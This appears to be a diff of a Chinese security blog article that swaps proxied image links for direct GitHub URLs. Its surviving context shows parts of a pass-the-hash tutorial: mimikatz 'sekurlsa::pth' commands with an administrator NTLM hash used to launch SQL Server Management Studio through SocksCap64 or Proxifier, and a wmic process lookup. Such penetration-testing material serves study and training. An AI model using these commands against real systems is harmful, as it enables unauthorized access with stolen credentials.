@@ -17,7 +17,7 @@ ___发表于_
 
 **     点击蓝字 关注我们**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141946.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141946.png)
 
  **免责声明**
 
@@ -45,15 +45,15 @@ ___发表于_
     sekurlsa::pth /user:administrator /domain:192.168.144.146 /ntlm:518b98ad4178a53695dc997aa02d455c "/run:C:\all\SocksCap64\SocksCap64_RunAsAdmin.exe"  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141948.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141948.png)
 
 ## 2.在sockscap中运行ssms
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141949.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141949.png)
 
 ## 3.输入目标服务器名称，连接即可
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141950.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141950.png)
 
 ![]()
 
@@ -64,7 +64,7 @@ ___发表于_
     wmic process where Name="SSMS.exe" get ParentProcessId  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141951.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141951.png)
 
 # 三、proxifier
 
@@ -82,11 +82,11 @@ ___发表于_
     sekurlsa::pth /user:administrator /domain:192.168.144.146 /ntlm:518b98ad4178a53695dc997aa02d455c "/run:C:\all\ssms\Common7\IDE\Ssms.exe"  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141952.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141952.png)
 
 ## 3.连接
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141953.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141953.png)
 
 ![]()
 
@@ -117,7 +117,7 @@ ___发表于_
 
 重大时刻安保|企业安全培训
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141946.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141946.png)
 
  **联系方式**
 
@@ -125,11 +125,11 @@ ___发表于_
 
 官网｜https://sechub.com.cn
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141955.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141955.png)
 
  **关注我们**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141956.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141956.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141957.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141956.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141956.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619141957.png)
 
  **公众号：** sechub安全
 
